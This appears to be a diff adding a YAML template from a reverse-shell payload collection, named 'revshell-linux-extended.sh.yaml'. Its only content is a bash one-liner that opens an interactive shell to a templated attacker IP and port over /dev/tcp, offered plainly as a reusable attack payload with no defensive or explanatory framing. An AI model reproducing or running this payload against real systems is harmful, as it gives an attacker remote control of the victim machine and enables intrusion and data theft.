@@ -1,0 +1,8 @@
+metadata:
+  filename: "revshell-linux-extended.sh.yaml"
+  tags: ["shell", "linux"]
+  created: "2025-03-29"
+  author: "Unknown"
+
+content: |
+  bash -c "bash -i >& /dev/tcp/<%=$(esh variables/attacker_ip)%>/<%=$(esh variables/shell_port)%> 0>&1"
